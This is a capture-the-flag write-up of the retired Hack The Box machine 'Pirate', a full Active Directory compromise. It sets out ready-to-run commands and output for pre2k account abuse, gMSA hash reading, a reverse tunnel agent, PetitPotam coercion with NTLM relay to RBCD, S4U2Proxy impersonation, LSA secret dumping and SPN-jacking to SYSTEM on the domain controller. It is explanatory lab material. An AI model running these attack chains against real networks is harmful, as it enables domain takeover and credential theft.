---
title: "Pirate"
date: 2026-09-05
tags: [windows, active-directory, pre2k, gmsa, kerberos, ntlm-relay, rbcd, constrained-delegation, spn-jacking, ligolo-ng, privesc]
difficulty: hard
platform: HTB
description: "Pre-Windows 2000 computer accounts leak a gMSA hash over Kerberos, landing WinRM on the DC. NTLM coercion relayed to unsigned LDAP configures RBCD for Administrator on WEB01, then an SPN moved onto the DC turns constrained delegation into Domain Admin."
featured: true
---

## Overview

| Field | Details |
|---|---|
| **Machine** | Pirate |
| **OS** | Windows |
| **Difficulty** | Hard |
| **Status** | Retired |
| **Released** | 2026-02-28 |
| **Domain** | pirate.htb |
| **DC** | DC01.pirate.htb |
| **Starting creds** | `pentest / p3nt3st2025!&` |

## TL;DR

- `pentest` creds are valid over SMB/LDAP but LDAP signing is disabled, and `pentest` sits in **Pre-Windows 2000 Compatible Access**
- `nxc ldap -M pre2k` finds pre-created computer accounts `MS01$`/`EXCH01$` whose default password is the lowercase computer name. `MS01$` has **ReadGMSAPassword** on `gMSA_ADFS_prod$`
- Read the gMSA hash over Kerberos (NTLM/channel binding blocks it) → `gMSA_ADFS_prod$` is in **Remote Management Users** → WinRM to DC01
- DC01 has a second interface reaching an internal-only subnet where WEB01 lives. Ligolo-ng tunnels into it
- WEB01 has SMB signing disabled. Coerce WEB01 via PetitPotam → relay to DC01 LDAPS (`--remove-mic` to survive the relay) → RBCD write onto `MS01$` (already-known creds from the pre2k step)
- S4U2Proxy as `MS01$`, impersonating Administrator → Administrator on WEB01 → user.txt
- `secretsdump` on WEB01 recovers a plaintext auto-logon password (`a.white`) from LSA secrets
- `a.white` has delegated reset rights over `a.white_adm`, which holds constrained delegation w/ protocol transition to `HTTP/WEB01.pirate.htb` and **WriteSPN** on both DC01 and WEB01
- Move the SPN from WEB01 to DC01, request an S4U2Proxy ticket with `-altservice CIFS/DC01.pirate.htb` → Administrator ticket resolves against the DC → `psexec.py` → SYSTEM on DC01 → root.txt


## Tools Used

`netexec (nxc)`, `impacket` (`getTGT`, `getST`, `secretsdump`, `psexec`), `evil-winrm`, `ligolo-ng`, `ntlmrelayx.py`, `bloodyAD`, `ldapmodify`, `bloodhound-python`, `ntpdate`

## Setup / Notes

```bash
echo "10.129.x.x DC01.pirate.htb pirate.htb DC01" | sudo tee -a /etc/hosts
sudo ntpdate pirate.htb
```

Kerberos needs hostname resolution and tolerates at most 5 minutes of clock skew. This DC runs with a skew of roughly +7 hours, so `ntpdate` is required before every Kerberos operation. Skip it and every `-k` request fails with `KRB_AP_ERR_SKEW`.

---

## Recon

### Port Scan

```bash
nmapfullscan 10.129.244.95
```

```
🔍 Step 1: Quick TCP-scan...
Host: 10.129.244.95 ()  Ports: 53/open/tcp//domain///, 80/open/tcp//http///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 2179/open/tcp//vmrdp///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 5985/open/tcp//wsman///, 9389/open/tcp//adws///, 49667/open/tcp/////, 49691/open/tcp/////, 49692/open/tcp/////, 49694/open/tcp/////, 49695/open/tcp/////, 49919/open/tcp/////, 49945/open/tcp/////

🔎 Step 2: Detailed scan on open TCP-ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-05 22:03:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-05T22:05:08+00:00; +6h59m58s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open  adws?
49667/tcp open  unknown
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  unknown
49694/tcp open  unknown
49695/tcp open  unknown
49919/tcp open  unknown
49945/tcp open  unknown
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m57s, deviation: 0s, median: 6h59m57s

🌊 Step 3: UDP-scan on top 100 ports...
PORT    STATE SERVICE      VERSION
53/udp  open  domain       (generic dns response: NOTIMP)
88/udp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-09-05 22:05:09Z)
123/udp open  ntp          NTP v3
```

Full Windows DC fingerprint: Kerberos, LDAP/LDAPS/GC-LDAP, SMB, WinRM, AD Web Services (9389), plus a stray IIS default page on 80 and NTP on UDP 123. SMB signing is enabled and required on the DC itself, which rules out relaying anything back to DC01 over SMB later and pushes the eventual coercion path toward WEB01 instead. Clock skew is nearly 7 hours, well outside Kerberos's 5-minute tolerance, hence `ntpdate` before any `-k` work.

### Credential Validation

Starting creds from the box description: `pentest / p3nt3st2025!&`

```bash
nxc smb pirate.htb -u 'pentest' -p 'p3nt3st2025!&'
nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&'
nxc winrm pirate.htb -u 'pentest' -p 'p3nt3st2025!&'
```

```
SMB    pirate.htb   445   DC01   [+] pirate.htb\pentest:p3nt3st2025!&
LDAP   pirate.htb   389   DC01   [+] pirate.htb\pentest:p3nt3st2025!& (signing:None, channel binding:Never)
WINRM  pirate.htb   5985  DC01   [-] pirate.htb\pentest:p3nt3st2025!& STATUS_ACCESS_DENIED
```

SMB and LDAP work, WinRM doesn't. The signal worth keeping: LDAP signing is **disabled**. That's a prerequisite for relaying NTLM to LDAP later, noted now for use downstream.

---

## Enumeration

### Domain Users

```bash
nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&' --users
```

`a.white` and `a.white_adm` stand out, a privilege-separation pattern where the standard account frequently holds reset rights over its admin twin.

### Kerberoasting

```bash
nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&' -k --kerberoasting output.txt
```

Two roastable SPNs: `a.white_adm` and `gMSA_ADFS_prod$`. Neither cracks against rockyou. Parked, see Rabbit Holes.

### BloodHound

```bash
bloodhound-python -dc 'dc01.pirate.htb' -d 'pirate.htb' -u 'pentest' -p 'p3nt3st2025!&' -ns 10.129.x.x --zip -c All
```

Path surfaced:

- `pentest` → **Pre-Windows 2000 Compatible Access** (via Authenticated Users)
- `MS01$` → **ReadGMSAPassword** on `gMSA_ADFS_prod$`
- `a.white_adm` → constrained delegation to `HTTP/WEB01.pirate.htb`
- `a.white_adm` → **WriteSPN** on both DC01 and WEB01

### Pre-Windows 2000 computer accounts

```bash
nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&' -M pre2k
```

```
PRE2K    Pre-created computer account: MS01$
PRE2K    Pre-created computer account: EXCH01$
PRE2K    [+] Successfully obtained TGT for ms01@pirate.htb
PRE2K    [+] Successfully obtained TGT for exch01@pirate.htb
```

Computer accounts created with pre-Windows 2000 compatibility default their password to the lowercase computer name minus the `$`. Both `MS01$` and `EXCH01$` still have theirs. Trying either over SMB returns `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`, not a failure. It confirms the password is correct but that account class can't do interactive SMB logons. Kerberos is the way in instead.

### Internal network discovery (post-foothold)

Recorded here for continuity, found after landing on DC01.

```powershell
ipconfig
```

```
vEthernet (Switch01): 192.168.100.1/24
```

WEB01 sits at `192.168.100.2`, reachable only from DC01. Pivot required.

---

## Foothold → gMSA hash via Pre2K + ReadGMSAPassword

### Why it's vulnerable

`MS01$`'s default password gets us a valid Kerberos identity for that computer account. That identity is a member of a group with **ReadGMSAPassword** on `gMSA_ADFS_prod$`. gMSA passwords are readable to any principal explicitly authorized in the `msDS-GroupMSAMembership` attribute, and that authorization here was scoped too broadly. NTLM over LDAP fails because channel binding is enforced; Kerberos auth sidesteps it since the check is NTLM-specific.

### Steps

```bash
impacket-getTGT 'pirate.htb/MS01$:ms01'
export KRB5CCNAME=MS01\$.ccache
nxc ldap dc01.pirate.htb -u 'MS01$' -p 'ms01' -k --gmsa
```

```
Account: gMSA_ADCS_prod$    NTLM: 25c7f0eb586ed3a91375dbf2f6e4a3ea
Account: gMSA_ADFS_prod$    NTLM: fd9ea7ac7820dba5155bd6ed2d850c09
```

`gMSA_ADFS_prod$` is a member of **Remote Management Users**, that's the WinRM path in.

```bash
evil-winrm -i 10.129.x.x -u 'gMSA_ADFS_prod$' -H 'fd9ea7ac7820dba5155bd6ed2d850c09'
```

Lands on DC01 as `gMSA_ADFS_prod$`, no admin, but with reachability into the internal `192.168.100.0/24` subnet.

---

## Post-Exploitation

### Pivoting with Ligolo-ng

```bash
# attack box
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
```

```powershell
# DC01
upload /path/to/agent.exe
.\agent.exe -connect 10.10.x.x:11601 -ignore-cert
```

```bash
# attack box - select session, start tunnel, add route
sudo ip route add 192.168.100.0/24 dev ligolo
```

WEB01 is now reachable directly. `nxc smb 192.168.100.2` shows SMB signing **disabled** there too.

---

## Privilege Escalation → NTLM Relay to RBCD → S4U2Proxy

### Why it works

WEB01 has SMB signing off, DC01 has LDAP signing off. That's the whole setup: coerce WEB01 into authenticating to us via PetitPotam (MS-EFSRPC), relay the NTLM auth to DC01's LDAPS, and use the resulting session, which has WEB01$'s machine identity, to write RBCD on WEB01 pointing at `MS01$` (already-known credentials from the pre2k step, so no need to spin up a fresh computer account). RBCD lets the trusted account request a service ticket to WEB01 impersonating anyone, including Administrator, without needing that account's actual credentials.

### Steps

Start the relay:

```bash
ntlmrelayx.py -t ldaps://DC01.pirate.htb --delegate-access --escalate-user 'MS01$' --remove-mic -smb2support
```

`--escalate-user` targets the RBCD write at the `MS01$` computer account rather than a freshly created one. `--remove-mic` strips the NTLM Message Integrity Code, which is what lets an SMB-sourced auth relay to LDAP despite integrity checks.

Trigger coercion with PetitPotam:

```bash
PetitPotam.py \
  -u 'gMSA_ADFS_prod$' \
  -hashes :fd9ea7ac7820dba5155bd6ed2d850c09 \
  -d pirate.htb \
  10.10.x.x 192.168.100.2
```

PetitPotam abuses MS-EFSRPC to coerce WEB01's machine account into authenticating back to the listener. The relay catches it:

```
[*] Authenticating connection from PIRATE/WEB01$@10.129.x.x against ldaps://DC01.pirate.htb SUCCEED
[*] Delegation rights modified successfully!
[*] MS01$ can now impersonate users on WEB01$ via S4U2Proxy
```

`set_rbcd` writes `MS01$` into WEB01's `msDS-AllowedToActOnBehalfOfOtherIdentity`, since `MS01$`'s credentials are already known from the pre2k step.

Request the S4U2Proxy ticket:

```bash
impacket-getST 'pirate.htb/MS01$:ms01' \
  -spn HTTP/WEB01.pirate.htb \
  -impersonate Administrator \
  -dc-ip 10.129.x.x

export KRB5CCNAME=Administrator@HTTP_WEB01.pirate.htb@PIRATE.HTB.ccache
evil-winrm -i WEB01.pirate.htb -r PIRATE.HTB -K $KRB5CCNAME
```

Administrator on WEB01. `user.txt` is at `C:\Users\a.white\Desktop\user.txt`.

---

## Root → SPN-Jacking Constrained Delegation

### Why it works

`secretsdump` against WEB01 pulls LSA secrets, including a `DefaultPassword` entry. `a.white` was configured for auto-logon, and Windows stores that password in the registry in plaintext:

```bash
impacket-secretsdump -k -no-pass WEB01.pirate.htb
```

```
[*] DefaultPassword
PIRATE\a.white:E2nvAOKSz5Xz2MJu
```

Also recovers WEB01$'s machine hash (`feba09cf0013fbf5834f50def734bca9`), unused in the final chain but noted.

`a.white` holds delegated reset rights over `a.white_adm`:

```bash
bloodyAD -d pirate.htb -u a.white -p 'E2nvAOKSz5Xz2MJu' --host DC01.pirate.htb set password 'a.white_adm' 'NewP@ss2026!'
```

```bash
nxc ldap DC01.pirate.htb -u a.white_adm -p 'NewP@ss2026!' --find-delegation
```

```
a.white_adm    Person    Constrained w/ Protocol Transition    http/WEB01.pirate.htb, HTTP/WEB01
```

`a.white_adm` can S4U-impersonate to `HTTP/WEB01.pirate.htb`, but that's scoped to WEB01, which is already owned. The account also holds **WriteSPN** on both DC01 and WEB01. SPNs are just attributes on an object; Kerberos resolves a service ticket request by looking up which object currently holds the matching SPN, not by any inherent binding to the object type. Move the SPN string to DC01, and a ticket requested for that SPN gets encrypted with DC01's key instead of WEB01's.

### Steps

Remove the SPN from WEB01:

```
# spn_remove.ldif
dn: CN=WEB01,CN=Computers,DC=pirate,DC=htb
changetype: modify
delete: servicePrincipalName
servicePrincipalName: HTTP/WEB01.pirate.htb
-
delete: servicePrincipalName
servicePrincipalName: HTTP/WEB01
```

```bash
ldapmodify -x -H ldap://DC01.pirate.htb -D "PIRATE\\a.white_adm" -w 'NewP@ss2026!' -f spn_remove.ldif
```

Add it to DC01:

```
# spn_add.ldif
dn: CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb
changetype: modify
add: servicePrincipalName
servicePrincipalName: HTTP/WEB01.pirate.htb
```

```bash
ldapmodify -x -H ldap://DC01.pirate.htb -D "PIRATE\\a.white_adm" -w 'NewP@ss2026!' -f spn_add.ldif
```

Request the ticket, changing the service type client-side via `-altservice`:

```bash
getST.py PIRATE.HTB/a.white_adm:'NewP@ss2026!' \
  -spn HTTP/WEB01.pirate.htb \
  -impersonate Administrator \
  -dc-ip 10.129.x.x \
  -altservice CIFS/DC01.pirate.htb
```

```
[*] Changing service from HTTP/WEB01.pirate.htb@PIRATE.HTB to CIFS/DC01.pirate.htb@PIRATE.HTB
[*] Saving ticket in Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
```

`-altservice` works because the S4U2Proxy ticket's service field isn't covered by the KDC's signature in a way that prevents client-side substitution. The delegation check validated `HTTP/WEB01.pirate.htb` as a permitted target, and the resulting ticket can be relabeled to a different service class (CIFS) against the same target host referenced by that SPN, which now resolves to DC01.

```bash
export KRB5CCNAME=Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
psexec.py -k -no-pass DC01.pirate.htb
```

```
C:\Windows\system32> whoami
nt authority\system
```

`root.txt` is at `C:\Users\Administrator\Desktop\root.txt`.

---

## Rabbit Holes

- **Kerberoasting `a.white_adm` / `gMSA_ADFS_prod$`.** Both roastable, neither crackable against rockyou. The real value of `a.white_adm` was its delegation config and WriteSPN rights, not its hash.
- **`EXCH01$` pre2k credential.** Also has a guessable default password like `MS01$`, but carries no useful group membership toward the gMSA. Never used.
- **WEB01$'s machine hash from secretsdump.** Recovered alongside `a.white`'s plaintext password but not needed once the SPN-jacking path opened up.

---

## Lessons Learned

- **`nxc -M pre2k` before anything else on a domain with Pre-Windows 2000 Compatible Access.** Default passwords on legacy computer accounts are an easy TGT, and TGTs open doors NTLM auth to the same account wouldn't (like ReadGMSAPassword under channel binding).
- **`STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` means the password is correct.** It's an account-type restriction on SMB, not a credential failure. Switch to Kerberos rather than assuming the password's wrong.
- **Unsigned LDAP + unsigned SMB on different hosts chains into RBCD.** Coercion doesn't need to target the box you're relaying to. It needs to target something that trusts the relay destination for delegation writes.
- **`--remove-mic` is what makes SMB→LDAP relay survive MIC enforcement.** Without it, a signed/verified auth blocks the relay even when signing itself is off.
- **SPNs are attributes, not identities.** Kerberos resolves whatever object currently holds the SPN string. Moving one is a legitimate abuse primitive whenever `WriteSPN` is available on a target you don't already control.
- **`-altservice` changes ticket service class client-side.** Constrained delegation scoped to `HTTP/target` doesn't stop the resulting ticket from being requested as `CIFS/target` if the KDC's delegation check doesn't independently validate the service type against intent.
- **LSA secrets on a box with auto-logon configured = plaintext creds.** Always run `secretsdump` even after landing admin; auto-logon `DefaultPassword` entries are a common credential-reuse pivot.

---

## Commands Reference

```bash
# Setup
echo "10.129.x.x DC01.pirate.htb pirate.htb DC01" | sudo tee -a /etc/hosts
sudo ntpdate pirate.htb

# Recon / enum
nxc smb pirate.htb -u 'pentest' -p 'p3nt3st2025!&'
nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&'
nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&' --users
nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&' -k --kerberoasting output.txt
bloodhound-python -dc 'dc01.pirate.htb' -d 'pirate.htb' -u 'pentest' -p 'p3nt3st2025!&' -ns 10.129.x.x --zip -c All
nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&' -M pre2k

# Foothold
impacket-getTGT 'pirate.htb/MS01$:ms01'
export KRB5CCNAME=MS01\$.ccache
nxc ldap dc01.pirate.htb -u 'MS01$' -p 'ms01' -k --gmsa
evil-winrm -i 10.129.x.x -u 'gMSA_ADFS_prod$' -H 'fd9ea7ac7820dba5155bd6ed2d850c09'

# Pivot
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
# on DC01: .\agent.exe -connect 10.10.x.x:11601 -ignore-cert
sudo ip route add 192.168.100.0/24 dev ligolo

# RBCD via relay
ntlmrelayx.py -t ldaps://DC01.pirate.htb --delegate-access --escalate-user 'MS01$' --remove-mic -smb2support
PetitPotam.py -u 'gMSA_ADFS_prod$' -hashes :fd9ea7ac7820dba5155bd6ed2d850c09 -d pirate.htb 10.10.x.x 192.168.100.2

impacket-getST 'pirate.htb/MS01$:ms01' -spn HTTP/WEB01.pirate.htb -impersonate Administrator -dc-ip 10.129.x.x
export KRB5CCNAME=Administrator@HTTP_WEB01.pirate.htb@PIRATE.HTB.ccache
evil-winrm -i WEB01.pirate.htb -r PIRATE.HTB -K $KRB5CCNAME

# Root
impacket-secretsdump -k -no-pass WEB01.pirate.htb
bloodyAD -d pirate.htb -u a.white -p 'E2nvAOKSz5Xz2MJu' --host DC01.pirate.htb set password 'a.white_adm' 'NewP@ss2026!'
nxc ldap DC01.pirate.htb -u a.white_adm -p 'NewP@ss2026!' --find-delegation
ldapmodify -x -H ldap://DC01.pirate.htb -D "PIRATE\\a.white_adm" -w 'NewP@ss2026!' -f spn_remove.ldif
ldapmodify -x -H ldap://DC01.pirate.htb -D "PIRATE\\a.white_adm" -w 'NewP@ss2026!' -f spn_add.ldif
getST.py PIRATE.HTB/a.white_adm:'NewP@ss2026!' -spn HTTP/WEB01.pirate.htb -impersonate Administrator -dc-ip 10.129.x.x -altservice CIFS/DC01.pirate.htb
export KRB5CCNAME=Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
psexec.py -k -no-pass DC01.pirate.htb
```

---

## References

- [Pre-Windows 2000 Compatible Access: default computer account passwords](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/security-implications-employ-pre-windows-2000-compatible-access)
- [gMSA passwords and PrincipalsAllowedToRetrieveManagedPassword](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/group-managed-service-accounts/group-managed-service-accounts-overview)
- [NTLM relay to LDAP/LDAPS and RBCD abuse (ntlmrelayx)](https://github.com/fortra/impacket)
- [Resource-Based Constrained Delegation (RBCD) abuse primitives](https://www.thehacker.recipes/ad/movement/kerberos/delegations/resource-based-constrained-delegation)
- [Constrained delegation, protocol transition, and S4U2Proxy service substitution](https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained-delegation)
